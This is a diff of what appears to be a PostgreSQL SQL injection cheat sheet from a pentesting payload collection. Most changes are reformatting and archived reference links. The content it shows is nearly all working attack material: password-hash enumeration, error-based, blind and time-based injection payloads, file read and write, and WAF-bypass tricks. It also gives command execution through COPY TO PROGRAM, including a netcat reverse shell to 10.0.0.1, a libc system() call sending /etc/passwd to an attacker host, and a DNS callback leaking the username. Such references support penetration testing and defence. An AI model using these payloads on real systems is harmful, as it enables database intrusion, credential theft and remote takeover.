@@ -2,7 +2,6 @@
 
 > PostgreSQL SQL injection refers to a type of security vulnerability where attackers exploit improperly sanitized user input to execute unauthorized SQL commands within a PostgreSQL database.
 
-
 ## Summary
 
 * [PostgreSQL Comments](#postgresql-comments)
@@ -28,7 +27,6 @@
     * [PostgreSQL Superuser Role](#postgresql-superuser-role)
 * [References](#references)
 
-
 ## PostgreSQL Comments
 
 | Type                | Comment |
@@ -36,46 +34,41 @@
 | Single-Line Comment | `--`    |
 | Multi-Line Comment  | `/**/`  |
 
-
 ## PostgreSQL Enumeration
 
-| Description            | SQL Query                               |
-| ---------------------- | --------------------------------------- |
-| DBMS version           | `SELECT version()`                      | 
-| Database Name          | `SELECT CURRENT_DATABASE()`             |
-| Database Schema        | `SELECT CURRENT_SCHEMA()`               |
-| List PostgreSQL Users  | `SELECT usename FROM pg_user`           |
-| List Password Hashes   | `SELECT usename, passwd FROM pg_shadow` |
+| Description            | SQL Query                                            |
+| ---------------------- | ---------------------------------------------------- |
+| DBMS version           | `SELECT version()`                                   |
+| Database Name          | `SELECT CURRENT_DATABASE()`                          |
+| Database Schema        | `SELECT CURRENT_SCHEMA()`                            |
+| List PostgreSQL Users  | `SELECT usename FROM pg_user`                        |
+| List Password Hashes   | `SELECT usename, passwd FROM pg_shadow`              |
 | List DB Administrators | `SELECT usename FROM pg_user WHERE usesuper IS TRUE` |
-| Current User           | `SELECT user;`                          |
-| Current User           | `SELECT current_user;`                  |
-| Current User           | `SELECT session_user;`                  |
-| Current User           | `SELECT usename FROM pg_user;`          |
-| Current User           | `SELECT getpgusername();`               |
-
+| Current User           | `SELECT user;`                                       |
+| Current User           | `SELECT current_user;`                               |
+| Current User           | `SELECT session_user;`                               |
+| Current User           | `SELECT usename FROM pg_user;`                       |
+| Current User           | `SELECT getpgusername();`                            |
 
 ## PostgreSQL Methodology
 
-| Description            | SQL Query                                    |
-| ---------------------- | -------------------------------------------- |
-| List Schemas           | `SELECT DISTINCT(schemaname) FROM pg_tables` |
-| List Databases         | `SELECT datname FROM pg_database`            | 
-| List Tables            | `SELECT table_name FROM information_schema.tables` |
-| List Tables            | `SELECT table_name FROM information_schema.tables WHERE table_schema='<SCHEMA_NAME>'` |
-| List Tables            | `SELECT tablename FROM pg_tables WHERE schemaname = '<SCHEMA_NAME>'` |
-| List Columns           | `SELECT column_name FROM information_schema.columns WHERE table_name='data_table'` |
-
+| Description    | SQL Query                                                                             |
+| -------------- | ------------------------------------------------------------------------------------- |
+| List Schemas   | `SELECT DISTINCT(schemaname) FROM pg_tables`                                          |
+| List Databases | `SELECT datname FROM pg_database`                                                     |
+| List Tables    | `SELECT table_name FROM information_schema.tables`                                    |
+| List Tables    | `SELECT table_name FROM information_schema.tables WHERE table_schema='<SCHEMA_NAME>'` |
+| List Tables    | `SELECT tablename FROM pg_tables WHERE schemaname = '<SCHEMA_NAME>'`                  |
+| List Columns   | `SELECT column_name FROM information_schema.columns WHERE table_name='data_table'`    |
 
 ## PostgreSQL Error Based
 
-| Name         | Payload         |
-| ------------ | --------------- |
+| Name | Payload                                                                 |
+| ---- | ----------------------------------------------------------------------- |
 | CAST | `AND 1337=CAST('~'\|\|(SELECT version())::text\|\|'~' AS NUMERIC) -- -` |
-| CAST | `AND (CAST('~'\|\|(SELECT version())::text\|\|'~' AS NUMERIC)) -- -` |
-| CAST | `AND CAST((SELECT version()) AS INT)=1337 -- -` |
-| CAST | `AND (SELECT version())::int=1 -- -` |
-
-
+| CAST | `AND (CAST('~'\|\|(SELECT version())::text\|\|'~' AS NUMERIC)) -- -`    |
+| CAST | `AND CAST((SELECT version()) AS INT)=1337 -- -`                         |
+| CAST | `AND (SELECT version())::int=1 -- -`                                    |
 
 ```sql
 CAST(chr(126)||VERSION()||chr(126) AS NUMERIC)
@@ -106,16 +99,15 @@ SELECT database_to_xmlschema(true,true,''); -- dump the current db to an XML sch
 
 Note, with the above queries, the output needs to be assembled in memory. For larger databases, this might cause a slow down or denial of service condition.
 
-
 ## PostgreSQL Blind
 
 ### PostgreSQL Blind With Substring Equivalent
 
 | Function    | Example                                         |
-| ----------- | ----------------------------------------------- | 
+| ----------- | ----------------------------------------------- |
 | `SUBSTR`    | `SUBSTR('foobar', <START>, <LENGTH>)`           |
-| `SUBSTRING` | `SUBSTRING('foobar', <START>, <LENGTH>)`        | 
-| `SUBSTRING` | `SUBSTRING('foobar' FROM <START> FOR <LENGTH>)` | 
+| `SUBSTRING` | `SUBSTRING('foobar', <START>, <LENGTH>)`        |
+| `SUBSTRING` | `SUBSTRING('foobar' FROM <START> FOR <LENGTH>)` |
 
 Examples:
 
@@ -124,10 +116,9 @@ Examples:
 ' and substr(version(),1,10) = 'PostgreXXX' and '1  -- FALSE
 ```
 
-
 ## PostgreSQL Time Based
 
-#### Identify Time Based
+### Identify Time Based
 
 ```sql
 select 1 from pg_sleep(5)
@@ -135,19 +126,19 @@ select 1 from pg_sleep(5)
 ||(select 1 from pg_sleep(5))
 ```
 
-#### Database Dump Time Based
+### Database Dump Time Based
 
 ```sql
 select case when substring(datname,1,1)='1' then pg_sleep(5) else pg_sleep(0) end from pg_database limit 1
 ```
 
-#### Table Dump Time Based
+### Table Dump Time Based
 
 ```sql
 select case when substring(table_name,1,1)='a' then pg_sleep(5) else pg_sleep(0) end from information_schema.tables limit 1
 ```
 
-#### Columns Dump Time Based
+### Columns Dump Time Based
 
 ```sql
 select case when substring(column,1,1)='1' then pg_sleep(5) else pg_sleep(0) end from table_name limit 1
@@ -162,7 +153,7 @@ AND [RANDNUM]=(SELECT COUNT(*) FROM GENERATE_SERIES(1,[SLEEPTIME]000000))
 
 ## PostgreSQL Out of Band
 
-Out-of-band SQL injections in PostgreSQL relies on the use of functions that can interact with the file system or network, such as `COPY`, `lo_export`, or functions from extensions that can perform network actions. The idea is to exploit the database to send data elsewhere, which the attacker can monitor and intercept. 
+Out-of-band SQL injections in PostgreSQL relies on the use of functions that can interact with the file system or network, such as `COPY`, `lo_export`, or functions from extensions that can perform network actions. The idea is to exploit the database to send data elsewhere, which the attacker can monitor and intercept.
 
 ```sql
 declare c text;
@@ -176,7 +167,6 @@ $$ language plpgsql security definer;
 SELECT f();
 ```
 
-
 ## PostgreSQL Stacked Query
 
 Use a semi-colon "`;`" to add another query
@@ -184,7 +174,6 @@ Use a semi-colon "`;`" to add another query
 ```sql
 SELECT 1;CREATE TABLE NOTSOSECURE (DATA VARCHAR(200));--
 ```
-
 
 ## PostgreSQL File Manipulation
 
@@ -215,7 +204,6 @@ NOTE: Earlier versions of Postgres did not accept absolute paths in `pg_read_fil
     SELECT * from pg_largeobject; -- or just get all the large objects and their data
     ```
 
-
 ### PostgreSQL File Write
 
 * Using `COPY`
@@ -241,7 +229,6 @@ NOTE: Earlier versions of Postgres did not accept absolute paths in `pg_read_fil
     SELECT lo_export(43210, '/tmp/testexport'); -- export data to /tmp/testexport
     ```
 
-
 ## PostgreSQL Command Execution
 
 ### Using COPY TO/FROM PROGRAM
@@ -249,14 +236,14 @@ NOTE: Earlier versions of Postgres did not accept absolute paths in `pg_read_fil
 Installations running Postgres 9.3 and above have functionality which allows for the superuser and users with '`pg_execute_server_program`' to pipe to and from an external program using `COPY`.
 
 ```sql
-COPY (SELECT '') to PROGRAM 'nslookup BURP-COLLABORATOR-SUBDOMAIN'
+COPY (SELECT '') TO PROGRAM 'getent hosts $(whoami).[BURP_COLLABORATOR_DOMAIN_CALLBACK]';
+COPY (SELECT '') to PROGRAM 'nslookup [BURP_COLLABORATOR_DOMAIN_CALLBACK]'
 ```
 
 ```sql
 CREATE TABLE shell(output text);
 COPY shell FROM PROGRAM 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f';
 ```
-
 
 ### Using libc.so.6
 
@@ -265,16 +252,16 @@ CREATE OR REPLACE FUNCTION system(cstring) RETURNS int AS '/lib/x86_64-linux-gnu
 SELECT system('cat /etc/passwd | nc <attacker IP> <attacker port>');
 ```
 
-
 ## PostgreSQL WAF Bypass
 
 ### Alternative to Quotes
 
-| Payload            | Technique |
-| ------------------ | --------- |
-| `SELECT CHR(65)\|\|CHR(66)\|\|CHR(67);` | String from `CHR()` |
-| `SELECT $TAG$This` | Dollar-sign ( >= version 8 PostgreSQL)   |
+PostgreSQL offers several ways to construct string values without using standard single-quoted literals. The `CHR()` function can generate individual characters from their numeric character codes, which can then be combined using the concatenation operator (`||`). PostgreSQL also supports dollar-quoted strings, available since version 8, allowing text to be enclosed between `$$` delimiters without escaping embedded single quotes.
 
+| Payload                                 | Technique                                       |
+| --------------------------------------- | ----------------------------------------------- |
+| `SELECT CHR(65)\|\|CHR(66)\|\|CHR(67);` | String from `CHR()`                             |
+| `SELECT $$NoQuote$$`                    | Dollar-Quoted String ( >= version 8 PostgreSQL) |
 
 ## PostgreSQL Privileges
 
@@ -296,10 +283,10 @@ SELECT usesuper FROM pg_user WHERE usename = CURRENT_USER;
 
 ## References
 
-- [A Penetration Tester's Guide to PostgreSQL - David Hayter - July 22, 2017](https://medium.com/@cryptocracker99/a-penetration-testers-guide-to-postgresql-d78954921ee9)
-- [Advanced PostgreSQL SQL Injection and Filter Bypass Techniques - Leon Juranic - June 17, 2009](https://www.infigo.hr/files/INFIGO-TD-2009-04_PostgreSQL_injection_ENG.pdf)
-- [Authenticated Arbitrary Command Execution on PostgreSQL 9.3 > Latest - GreenWolf - March 20, 2019](https://medium.com/greenwolf-security/authenticated-arbitrary-command-execution-on-postgresql-9-3-latest-cd18945914d5)
-- [Postgres SQL Injection Cheat Sheet - @pentestmonkey - August 23, 2011](http://pentestmonkey.net/cheat-sheet/sql-injection/postgres-sql-injection-cheat-sheet)
-- [PostgreSQL 9.x Remote Command Execution - dionach - October 26, 2017](https://www.dionach.com/blog/postgresql-9-x-remote-command-execution/)
-- [SQL Injection /webApp/oma_conf ctx parameter - Sergey Bobrov (bobrov) - December 8, 2016](https://hackerone.com/reports/181803)
-- [SQL Injection and Postgres - An Adventure to Eventual RCE - Denis Andzakovic - May 5, 2020](https://pulsesecurity.co.nz/articles/postgres-sqli)
+* [A Penetration Tester's Guide to PostgreSQL - David Hayter - July 22, 2017](https://web.archive.org/web/20250812102408/https://medium.com/@cryptocracker99/a-penetration-testers-guide-to-postgresql-d78954921ee9)
+* [Advanced PostgreSQL SQL Injection and Filter Bypass Techniques - Leon Juranic - June 17, 2009](https://web.archive.org/web/20200927000909/https://www.infigo.hr/files/INFIGO-TD-2009-04_PostgreSQL_injection_ENG.pdf)
+* [Authenticated Arbitrary Command Execution on PostgreSQL 9.3 > Latest - GreenWolf - March 20, 2019](https://web.archive.org/web/20250803101126/https://medium.com/greenwolf-security/authenticated-arbitrary-command-execution-on-postgresql-9-3-latest-cd18945914d5)
+* [Postgres SQL Injection Cheat Sheet - @pentestmonkey - August 23, 2011](https://web.archive.org/web/20260302153609/https://pentestmonkey.net/cheat-sheet/sql-injection/postgres-sql-injection-cheat-sheet)
+* [PostgreSQL 9.x Remote Command Execution - dionach - October 26, 2017](https://web.archive.org/web/20201001043242/https://www.dionach.com/blog/postgresql-9-x-remote-command-execution/)
+* [SQL Injection /webApp/oma_conf ctx parameter - Sergey Bobrov (bobrov) - December 8, 2016](https://web.archive.org/web/20240613225549/https://hackerone.com/reports/181803)
+* [SQL Injection and Postgres - An Adventure to Eventual RCE - Denis Andzakovic - May 5, 2020](https://web.archive.org/web/20251210040037/https://pulsesecurity.co.nz/articles/postgres-sqli)
